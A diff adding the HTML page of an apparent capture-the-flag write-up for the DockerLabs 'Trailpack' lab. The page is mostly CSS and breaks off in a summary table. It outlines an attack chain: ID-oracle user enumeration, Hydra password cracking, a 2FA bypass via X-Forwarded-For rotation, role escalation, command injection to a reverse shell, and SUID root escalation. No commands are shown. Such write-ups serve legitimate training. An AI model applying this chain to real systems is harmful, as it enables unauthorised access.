@@ -1,0 +1,2309 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1024">
+    <title>Trailpack — Dockerlabs Write-up | FLRS</title>
+    <meta name="description"
+        content="Write-up for the Trailpack machine on DockerLabs — Difficulty: Intermediate. DNI Oracle Enumeration · 2FA Bypass via XFF · Client-Side Role Escalation · Command Injection → Root.">
+    <meta name="author" content="Francisco Luis Rivero Sánchez">
+    <meta name="theme-color" content="#0a0a0a">
+
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico">
+    <link rel="apple-touch-icon" href="../../assets/apple-touch-icon.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=Inter:ital,wght@0,300;0,400;0,500;1,300&family=JetBrains+Mono:wght@400;500&display=swap"
+        rel="stylesheet">
+
+    <style>
+        html,
+        body {
+            max-width: 100%;
+            overflow-x: clip;
+        }
+
+        :root {
+            --bg: #050810;
+            --bg-2: #07090E;
+            --bg-3: #0E1522;
+            --surface: rgba(10, 14, 24, 0.82);
+            --border: rgba(0, 210, 255, 0.08);
+            --border-h: rgba(0, 210, 255, 0.28);
+            --accent: #00D2FF;
+            --accent-dim: rgba(0, 210, 255, 0.09);
+            --accent-2: #6E5BFF;
+            --text: #D2E6F6;
+            --text-2: #AABCCE;
+            --text-3: #546878;
+            --ok: #00ff88;
+            --warn: #ffaa00;
+            --danger: #ff5050;
+            --font-d: 'Syne', sans-serif;
+            --font-b: 'Inter', sans-serif;
+            --font-m: 'JetBrains Mono', monospace;
+            --glow: 0 0 35px rgba(0, 210, 255, 0.18);
+            --glow-sm: 0 0 16px rgba(0, 210, 255, 0.12);
+            --r: 10px;
+            --ease: cubic-bezier(0.25, 0.46, 0.45, 0.94);
+        }
+
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: var(--font-b);
+            font-size: 16px;
+            line-height: 1.7;
+            font-weight: 300;
+            overflow-x: clip;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: radial-gradient(circle, rgba(0, 210, 255, 0.10) 1px, transparent 1px);
+            background-size: 44px 44px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            width: 700px;
+            height: 700px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(0, 210, 255, 0.04) 0%, transparent 65%);
+            top: -280px;
+            right: -280px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .progress-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            z-index: 300;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--accent);
+            width: 0%;
+            transition: width 0.1s ease;
+            box-shadow: var(--glow-sm);
+        }
+
+        nav {
+            position: fixed;
+            inset: 0 0 auto 0;
+            z-index: 200;
+            padding: 1.4rem 4.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(22px) saturate(180%);
+            -webkit-backdrop-filter: blur(22px) saturate(180%);
+            background: rgba(5, 8, 16, 0.72);
+            border-bottom: 1px solid var(--border);
+            transition: border-color 0.3s;
+        }
+
+        .nav-logo {
+            font-family: var(--font-d);
+            font-size: 1.05rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: var(--text);
+            text-decoration: none;
+        }
+
+        .nav-logo em {
+            font-style: normal;
+            color: var(--accent);
+        }
+
+        .nav-back {
+            font-family: var(--font-m);
+            font-size: 0.72rem;
+            color: var(--text-2);
+            text-decoration: none;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            transition: color 0.2s var(--ease);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .nav-back:hover {
+            color: var(--accent);
+        }
+
+        .writeup-hero {
+            position: relative;
+            z-index: 1;
+            min-height: 50vh;
+            display: flex;
+            align-items: flex-end;
+            padding: 9rem 5.5rem 4rem;
+            border-bottom: 1px solid var(--border);
+            overflow: hidden;
+        }
+
+        .hero-glow-bg {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            background: radial-gradient(ellipse 60% 80% at 10% 60%, rgba(110, 91, 255, 0.05) 0%, transparent 70%);
+        }
+
+        .writeup-hero-content {
+            position: relative;
+            z-index: 2;
+            max-width: 900px;
+        }
+
+        .breadcrumb {
+            font-family: var(--font-m);
+            font-size: 0.68rem;
+            color: var(--text-3);
+            letter-spacing: 0.1em;
+            margin-bottom: 1.2rem;
+            opacity: 0;
+            animation: fadeUp 0.45s var(--ease) 0.05s forwards;
+        }
+
+        .breadcrumb a {
+            color: var(--text-3);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .breadcrumb a:hover {
+            color: var(--accent);
+        }
+
+        .breadcrumb .sep {
+            margin: 0 0.5rem;
+        }
+
+        .breadcrumb .current {
+            color: var(--accent);
+        }
+
+        .writeup-title-h {
+            font-family: var(--font-d);
+            font-size: clamp(3rem, 7vw, 5.5rem);
+            font-weight: 800;
+            letter-spacing: -0.045em;
+            line-height: 0.92;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, #E6F0F8 0%, #7DAFCC 60%, var(--accent) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.2s forwards;
+        }
+
+        .writeup-subtitle {
+            font-family: var(--font-m);
+            font-size: 0.8rem;
+            color: var(--text-2);
+            letter-spacing: 0.05em;
+            margin-bottom: 1.8rem;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.35s forwards;
+        }
+
+        .writeup-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.7rem;
+            align-items: center;
+            opacity: 0;
+            animation: fadeUp 0.65s var(--ease) 0.5s forwards;
+        }
+
+        .meta-badge {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            padding: 0.28rem 0.8rem;
+            border-radius: 4px;
+            border: 1px solid;
+        }
+
+        .badge-easy {
+            color: var(--ok);
+            border-color: rgba(0, 255, 136, 0.3);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .badge-medium {
+            color: var(--warn);
+            border-color: rgba(255, 170, 0, 0.3);
+            background: rgba(255, 170, 0, 0.05);
+        }
+
+        .badge-hard {
+            color: var(--danger);
+            border-color: rgba(255, 80, 80, 0.3);
+            background: rgba(255, 80, 80, 0.05);
+        }
+
+        .badge-docker {
+            color: var(--accent);
+            border-color: rgba(0, 210, 255, 0.25);
+            background: var(--accent-dim);
+        }
+
+        .badge-linux {
+            color: var(--ok);
+            border-color: rgba(0, 255, 136, 0.2);
+            background: rgba(0, 255, 136, 0.04);
+        }
+
+        .badge-web {
+            color: #a78bfa;
+            border-color: rgba(167, 139, 250, 0.25);
+            background: rgba(167, 139, 250, 0.05);
+        }
+
+        .badge-injection {
+            color: var(--danger);
+            border-color: rgba(255, 80, 80, 0.25);
+            background: rgba(255, 80, 80, 0.04);
+        }
+
+        .badge-bypass {
+            color: #f472b6;
+            border-color: rgba(244, 114, 182, 0.25);
+            background: rgba(244, 114, 182, 0.04);
+        }
+
+        .badge-privesc {
+            color: var(--warn);
+            border-color: rgba(255, 170, 0, 0.25);
+            background: rgba(255, 170, 0, 0.04);
+        }
+
+        .meta-date {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            color: var(--text-3);
+            padding-left: 0.5rem;
+        }
+
+        .writeup-layout {
+            position: relative;
+            z-index: 1;
+            display: grid;
+            grid-template-columns: 1fr 260px;
+            align-items: start;
+            gap: 3.5rem;
+            max-width: 1080px;
+            margin: 0 auto;
+            padding: 4rem 2.5rem;
+        }
+
+        .sidebar {
+            position: sticky;
+            top: 5.5rem;
+            height: fit-content;
+            align-self: start;
+            order: 2;
+        }
+
+        .sidebar-box {
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1.4rem;
+            background: var(--surface);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            margin-bottom: 1.2rem;
+        }
+
+        .sidebar-title {
+            font-family: var(--font-m);
+            font-size: 0.6rem;
+            color: var(--accent);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 1rem;
+        }
+
+        .toc-list {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 0.2rem;
+        }
+
+        .toc-list a {
+            font-family: var(--font-m);
+            font-size: 0.68rem;
+            color: var(--text-3);
+            text-decoration: none;
+            letter-spacing: 0.04em;
+            transition: all 0.2s;
+            display: block;
+            padding: 0.3rem 0.75rem;
+            border-left: 2px solid transparent;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .toc-list a:hover,
+        .toc-list a.active {
+            color: var(--accent);
+            border-left-color: var(--accent);
+            background: var(--accent-dim);
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 0.7rem;
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-label {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--text-3);
+            letter-spacing: 0.05em;
+        }
+
+        .info-val {
+            font-family: var(--font-m);
+            font-size: 0.7rem;
+        }
+
+        .val-accent {
+            color: var(--accent);
+        }
+
+        .val-ok {
+            color: var(--ok);
+        }
+
+        .val-warn {
+            color: var(--warn);
+        }
+
+        .val-danger {
+            color: var(--danger);
+        }
+
+        .val-purple {
+            color: var(--accent-2);
+        }
+
+        .attack-path {
+            display: flex;
+            flex-direction: column;
+            gap: 0;
+        }
+
+        .ap-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.8rem;
+            padding: 0.45rem 0;
+        }
+
+        .ap-dot {
+            width: 7px;
+            height: 7px;
+            background: var(--accent);
+            border-radius: 50%;
+            margin-top: 5px;
+            flex-shrink: 0;
+            box-shadow: 0 0 6px rgba(0, 210, 255, 0.6);
+        }
+
+        .ap-line {
+            width: 1px;
+            height: 14px;
+            background: var(--border);
+            margin: 0 3px;
+        }
+
+        .ap-text {
+            font-family: var(--font-m);
+            font-size: 0.63rem;
+            color: var(--text-3);
+            line-height: 1.6;
+        }
+
+        .ap-text span {
+            color: var(--accent);
+        }
+
+        .writeup-content {
+            min-width: 0;
+            order: 1;
+        }
+
+        .section {
+            margin-bottom: 4rem;
+            opacity: 0;
+            transform: translateY(22px);
+            transition: opacity 0.6s var(--ease), transform 0.6s var(--ease);
+        }
+
+        .section.visible {
+            opacity: 1;
+            transform: none;
+        }
+
+        .section-label {
+            font-family: var(--font-m);
+            font-size: 0.65rem;
+            color: var(--accent);
+            letter-spacing: 0.22em;
+            text-transform: uppercase;
+            margin-bottom: 0.4rem;
+        }
+
+        .section-title {
+            font-family: var(--font-d);
+            font-size: 1.6rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: var(--text);
+            margin-bottom: 0.5rem;
+        }
+
+        .section-line {
+            width: 36px;
+            height: 2px;
+            background: var(--accent);
+            margin-bottom: 2rem;
+            opacity: 0.6;
+        }
+
+        hr.divider {
+            border: none;
+            border-top: 1px solid var(--border);
+            margin: 0 0 4rem 0;
+        }
+
+        .prose p {
+            font-size: 1rem;
+            line-height: 2.0;
+            color: var(--text-2);
+            margin-bottom: 1rem;
+        }
+
+        .prose p strong {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .prose p .hl {
+            color: var(--accent);
+        }
+
+        .prose p .hl-ok {
+            color: var(--ok);
+        }
+
+        .prose p .hl-warn {
+            color: var(--warn);
+        }
+
+        .prose p .hl-bad {
+            color: var(--danger);
+        }
+
+        .prose p .hl-pur {
+            color: var(--accent-2);
+        }
+
+        .prose p code {
+            font-family: var(--font-m);
+            font-size: 0.85em;
+            color: var(--accent);
+            background: var(--bg-3);
+            padding: 0.05rem 0.35rem;
+            border-radius: 3px;
+        }
+
+        .step-marker {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+            margin-top: 2.2rem;
+        }
+
+        .step-num {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            font-weight: 500;
+            color: var(--bg);
+            background: var(--accent);
+            width: 26px;
+            height: 26px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .step-title {
+            font-family: var(--font-m);
+            font-size: 0.75rem;
+            color: var(--accent);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+        }
+
+        .cmd-block {
+            background: var(--bg-3);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: 0 var(--r) var(--r) 0;
+            padding: 1rem 1.2rem;
+            margin: 1rem 0;
+            font-family: var(--font-m);
+            font-size: 0.8rem;
+            overflow-x: auto;
+            position: relative;
+            line-height: 1.85;
+        }
+
+        .cmd-block.code-block {
+            border-left-color: var(--accent-2);
+            padding-top: 2.2rem;
+        }
+
+        .cmd-label {
+            position: absolute;
+            top: 0.5rem;
+            right: 4.5rem;
+            font-size: 0.58rem;
+            color: var(--text-3);
+            letter-spacing: 0.12em;
+            text-transform: uppercase;
+        }
+
+        .cmd-block .prompt {
+            color: var(--accent);
+            user-select: none;
+        }
+
+        .cmd-block .cmd {
+            color: var(--text);
+        }
+
+        .cmd-block .flag {
+            color: var(--accent-2);
+        }
+
+        .cmd-block .arg {
+            color: var(--warn);
+        }
+
+        .cmd-block .comment {
+            color: var(--text-3);
+            font-size: 0.73rem;
+        }
+
+        .cmd-block .kw {
+            color: #f472b6;
+        }
+
+        .cmd-block .str {
+            color: var(--ok);
+        }
+
+        .cmd-block .num {
+            color: var(--warn);
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.8rem;
+            background: var(--bg-2);
+            border: 1px solid var(--border);
+            color: var(--text-3);
+            font-family: var(--font-m);
+            font-size: 0.6rem;
+            padding: 0.15rem 0.5rem;
+            letter-spacing: 0.08em;
+            cursor: pointer;
+            opacity: 0;
+            transition: opacity 0.2s, background 0.2s, color 0.2s;
+            border-radius: 3px;
+        }
+
+        .cmd-block:hover .copy-btn {
+            opacity: 1;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent);
+            color: #000;
+            border-color: var(--accent);
+        }
+
+        .copy-btn.copied {
+            background: var(--ok);
+            color: #000;
+            border-color: var(--ok);
+            opacity: 1;
+        }
+
+        .output-block {
+            background: #030508;
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1rem 1.2rem;
+            margin: 0.5rem 0 1.5rem;
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            line-height: 1.9;
+            color: var(--text-2);
+            overflow-x: auto;
+        }
+
+        .o-accent {
+            color: var(--accent);
+        }
+
+        .o-ok {
+            color: var(--ok);
+        }
+
+        .o-warn {
+            color: var(--warn);
+        }
+
+        .o-bad {
+            color: var(--danger);
+        }
+
+        .o-white {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .o-purple {
+            color: var(--accent-2);
+        }
+
+        .o-pink {
+            color: #f472b6;
+        }
+
+        .info-box {
+            border: 1px solid rgba(0, 210, 255, 0.18);
+            background: rgba(0, 210, 255, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .info-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--accent);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .info-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .info-box p strong {
+            color: var(--accent);
+        }
+
+        .warn-box {
+            border: 1px solid rgba(255, 170, 0, 0.22);
+            background: rgba(255, 170, 0, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .warn-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--warn);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .warn-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .warn-box p strong {
+            color: var(--warn);
+        }
+
+        .danger-box {
+            border: 1px solid rgba(255, 80, 80, 0.22);
+            background: rgba(255, 80, 80, 0.04);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .danger-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--danger);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .danger-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .danger-box p strong {
+            color: var(--danger);
+        }
+
+        .ok-box {
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            background: rgba(0, 255, 136, 0.03);
+            border-radius: var(--r);
+            padding: 1.2rem 1.5rem;
+            margin: 1.2rem 0;
+        }
+
+        .ok-box-title {
+            font-family: var(--font-m);
+            font-size: 0.62rem;
+            color: var(--ok);
+            letter-spacing: 0.2em;
+            text-transform: uppercase;
+            margin-bottom: 0.6rem;
+        }
+
+        .ok-box p {
+            font-family: var(--font-m);
+            font-size: 0.76rem;
+            color: var(--text-2);
+            line-height: 1.85;
+        }
+
+        .ok-box p strong {
+            color: var(--ok);
+        }
+
+        .vuln-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+
+        .vuln-table th,
+        .vuln-table td {
+            font-family: var(--font-m);
+            font-size: 0.7rem;
+            padding: 0.75rem 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .vuln-table th {
+            color: var(--accent);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            font-weight: 500;
+            border-bottom-color: rgba(0, 210, 255, 0.2);
+        }
+
+        .vuln-table td {
+            color: var(--text-2);
+        }
+
+        .vuln-table td:first-child {
+            color: var(--accent);
+        }
+
+        .cmd-ref-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.2rem;
+            margin-top: 1.5rem;
+        }
+
+        .cmd-ref-card {
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            background: var(--surface);
+            padding: 1.5rem;
+            transition: border-color 0.3s;
+        }
+
+        .cmd-ref-card:hover {
+            border-color: rgba(0, 210, 255, 0.22);
+        }
+
+        .cmd-ref-name {
+            font-family: var(--font-m);
+            font-size: 0.9rem;
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            letter-spacing: 0.05em;
+        }
+
+        .cmd-ref-syntax {
+            font-family: var(--font-m);
+            font-size: 0.72rem;
+            color: var(--ok);
+            background: var(--bg-3);
+            padding: 0.4rem 0.7rem;
+            margin-bottom: 0.8rem;
+            display: inline-block;
+            border-radius: 4px;
+        }
+
+        .cmd-ref-desc {
+            font-size: 0.88rem;
+            color: var(--text-2);
+            line-height: 1.8;
+            margin-bottom: 0.8rem;
+        }
+
+        .cmd-ref-flags {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 0.3rem;
+        }
+
+        .cmd-ref-flags li {
+            font-family: var(--font-m);
+            font-size: 0.7rem;
+            color: var(--text-3);
+        }
+
+        .cmd-ref-flags li code {
+            color: var(--accent);
+        }
+
+        .vuln-banner {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem 1.4rem;
+            border-radius: var(--r);
+            margin-bottom: 1.8rem;
+            border: 1px solid;
+        }
+
+        .vuln-banner.vuln-info {
+            border-color: rgba(0, 210, 255, 0.2);
+            background: rgba(0, 210, 255, 0.04);
+        }
+
+        .vuln-banner.vuln-warn {
+            border-color: rgba(255, 170, 0, 0.2);
+            background: rgba(255, 170, 0, 0.04);
+        }
+
+        .vuln-banner.vuln-danger {
+            border-color: rgba(255, 80, 80, 0.2);
+            background: rgba(255, 80, 80, 0.04);
+        }
+
+        .vuln-banner.vuln-purple {
+            border-color: rgba(110, 91, 255, 0.2);
+            background: rgba(110, 91, 255, 0.04);
+        }
+
+        .vuln-banner-num {
+            font-family: var(--font-d);
+            font-size: 2rem;
+            font-weight: 800;
+            opacity: 0.15;
+            line-height: 1;
+            flex-shrink: 0;
+        }
+
+        .vuln-banner-body {
+            flex: 1;
+        }
+
+        .vuln-banner-tag {
+            font-family: var(--font-m);
+            font-size: 0.58rem;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            margin-bottom: 0.2rem;
+        }
+
+        .vuln-banner.vuln-info .vuln-banner-tag {
+            color: var(--accent);
+        }
+
+        .vuln-banner.vuln-warn .vuln-banner-tag {
+            color: var(--warn);
+        }
+
+        .vuln-banner.vuln-danger .vuln-banner-tag {
+            color: var(--danger);
+        }
+
+        .vuln-banner.vuln-purple .vuln-banner-tag {
+            color: var(--accent-2);
+        }
+
+        .vuln-banner-title {
+            font-family: var(--font-d);
+            font-size: 1.05rem;
+            font-weight: 800;
+            letter-spacing: -0.01em;
+            color: var(--text);
+        }
+
+        .glos-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .glos-card {
+            border: 1px solid var(--border);
+            border-radius: var(--r);
+            padding: 1.4rem;
+            background: var(--surface);
+        }
+
+        .glos-term {
+            font-family: var(--font-m);
+            font-size: 0.75rem;
+            color: var(--accent);
+            letter-spacing: 0.06em;
+            margin-bottom: 0.6rem;
+        }
+
+        .glos-def {
+            font-size: 0.85rem;
+            color: var(--text-2);
+            line-height: 1.9;
+        }
+
+        .glos-def strong {
+            color: var(--text);
+            font-weight: 500;
+        }
+
+        .glos-def code {
+            font-family: var(--font-m);
+            font-size: 0.78rem;
+            color: var(--accent);
+            background: var(--bg-3);
+            padding: 0.05rem 0.35rem;
+            border-radius: 3px;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--accent);
+            color: #000;
+            padding: 0.65rem 1.3rem;
+            font-family: var(--font-m);
+            font-size: 0.72rem;
+            letter-spacing: 0.1em;
+            border-radius: 5px;
+            opacity: 0;
+            transform: translateY(8px);
+            transition: opacity 0.25s, transform 0.25s;
+            pointer-events: none;
+            z-index: 10000;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        footer {
+            position: relative;
+            z-index: 1;
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid var(--border);
+            font-family: var(--font-m);
+            font-size: 0.67rem;
+            color: var(--text-3);
+            letter-spacing: 0.1em;
+        }
+
+        footer em {
+            font-style: normal;
+            color: var(--accent);
+        }
+
+        @keyframes fadeUp {
+            from {
+                opacity: 0;
+                transform: translateY(18px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @media (max-width: 860px) {
+            nav {
+                padding: 1.2rem 1.75rem;
+            }
+
+            .writeup-hero {
+                padding: 7rem 1.75rem 3rem;
+            }
+
+            .writeup-layout {
+                grid-template-columns: 1fr;
+                padding: 3rem 1.75rem;
+            }
+
+            .sidebar {
+                position: static;
+                order: -1;
+            }
+
+            .cmd-ref-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="progress-container">
+        <div class="progress-bar" id="readingProgress"></div>
+    </div>
+
+    <nav id="nav">
+        <a href="../../" class="nav-logo">franlrs<em>.</em></a>
+        <a href="../../writeups" class="nav-back">← Write-ups</a>
+    </nav>
+
+    <div class="writeup-hero">
+        <div class="hero-glow-bg"></div>
+        <div class="writeup-hero-content">
+            <div class="breadcrumb">
+                <a href="../../">Portfolio</a>
+                <span class="sep">/</span>
+                <a href="../../writeups">Write-ups</a>
+                <span class="sep">/</span>
+                <span class="current">Trailpack</span>
+            </div>
+            <h1 class="writeup-title-h">Trailpack.</h1>
+            <p class="writeup-subtitle">DockerLabs · DNI Oracle · 2FA XFF Bypass · Role Escalation · Command Injection →
+                Root</p>
+            <div class="writeup-meta">
+                <span class="meta-badge badge-medium">Intermediate</span>
+                <span class="meta-badge badge-docker">Dockerlabs</span>
+                <span class="meta-badge badge-linux">Linux</span>
+                <span class="meta-badge badge-web">Web App</span>
+                <span class="meta-badge badge-bypass">2FA Bypass</span>
+                <span class="meta-badge badge-injection">Command Injection</span>
+                <span class="meta-badge badge-privesc">PrivEsc SUID</span>
+                <span class="meta-date">May 2026</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="writeup-layout">
+
+        <aside class="sidebar">
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Machine Info</p>
+                <div class="info-row">
+                    <span class="info-label">Platform</span>
+                    <span class="info-val val-accent">Dockerlabs</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Difficulty</span>
+                    <span class="info-val val-warn">Intermediate</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">OS</span>
+                    <span class="info-val val-ok">Linux</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Target</span>
+                    <span class="info-val val-accent">172.17.0.2:8000</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Attacker</span>
+                    <span class="info-val" style="color:var(--text-2)">10.0.2.15</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Vulns</span>
+                    <span class="info-val val-danger">4 chained</span>
+                </div>
+            </div>
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Contents</p>
+                <ul class="toc-list">
+                    <li><a href="#summary">01 — Summary</a></li>
+                    <li><a href="#setup">02 — Setup</a></li>
+                    <li><a href="#vuln1">03 — Vuln 1: DNI Oracle</a></li>
+                    <li><a href="#vuln2">04 — Vuln 2: 2FA Bypass</a></li>
+                    <li><a href="#vuln3">05 — Vuln 3: Role Escalation</a></li>
+                    <li><a href="#vuln4">06 — Vuln 4: Cmd Injection</a></li>
+                    <li><a href="#cmdref">07 — Tool Reference</a></li>
+                    <li><a href="#glossary">08 — Glossary</a></li>
+                </ul>
+            </div>
+
+            <div class="sidebar-box">
+                <p class="sidebar-title">// Attack Path</p>
+                <div class="attack-path">
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text">Deploy → <span>172.17.0.2:8000</span></div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text"><span>DNI Oracle</span> — enumerate valid users</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot"></div>
+                        <div class="ap-text"><span>Hydra</span> → password: chocolate</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot" style="background:var(--warn);box-shadow:0 0 6px var(--warn)"></div>
+                        <div class="ap-text"><span style="color:var(--warn)">2FA bypass</span> via X-Forwarded-For</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot" style="background:var(--accent-2);box-shadow:0 0 6px var(--accent-2)"></div>
+                        <div class="ap-text"><span style="color:var(--accent-2)">Role → admin</span> via Burp
+                            match-replace</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot" style="background:#f472b6;box-shadow:0 0 6px #f472b6"></div>
+                        <div class="ap-text"><span style="color:#f472b6">Cmd injection</span> → reverse shell</div>
+                    </div>
+                    <div class="ap-line"></div>
+                    <div class="ap-item">
+                        <div class="ap-dot" style="background:var(--danger);box-shadow:0 0 6px var(--danger)"></div>
+                        <div class="ap-text"><span style="color:var(--danger)">SUID env → ROOT ✓</span></div>
+                    </div>
+                </div>
+            </div>
+
+        </aside>
+
+        <main class="writeup-content" id="main-content">
+
+            <!-- ============================================================ SUMMARY -->
+            <div class="section" id="summary">
+                <p class="section-label">// 01</p>
+                <h2 class="section-title">Summary</h2>
+                <div class="section-line"></div>
+
+                <div class="prose">
+                    <p>
+                        <strong>Trailpack</strong> is a <span class="hl-warn">Intermediate </span> difficulty machine from
+                        <span class="hl">DockerLabs</span> that simulates a realistic web application with
+                        multiple chained vulnerabilities. Unlike single-exploit machines, this one requires
+                        identifying and sequentially abusing <strong>four distinct security flaws</strong>
+                        before achieving full root access.
+                    </p>
+                    <p>
+                        The target is a <strong>Django-based web application</strong> running on port
+                        <span class="hl">8000</span> that exposes a user registration and authentication flow
+                        protected by a Two-Factor Authentication (2FA) PIN system. Administrative features
+                        are role-gated, and a review submission form is present once authenticated.
+                    </p>
+                    <p>
+                        The attack chain begins by leveraging an <span class="hl-bad">information disclosure</span>
+                        vulnerability in the registration form, which inadvertently confirms whether a given
+                        DNI (Spanish national ID) is already registered — functioning as an oracle for valid
+                        user enumeration. After discovering a valid DNI and cracking the password with Hydra,
+                        a <span class="hl-warn">2FA rate-limiting bypass</span> via the
+                        <code>X-Forwarded-For</code> header allows brute-forcing the PIN. A
+                        <span class="hl-pur">client-side role escalation</span> via Burp Suite's match-replace
+                        feature elevates privileges to admin. Finally, an
+                        <span class="hl-bad">OS command injection</span> vulnerability in the reviews panel
+                        delivers a reverse shell, and a misonfigured <strong>SUID binary</strong> escalates
+                        to root.
+                    </p>
+                </div>
+
+                <table class="vuln-table">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Vulnerability</th>
+                            <th>Technique / Tool</th>
+                            <th>Impact</th>
+                        </tr>
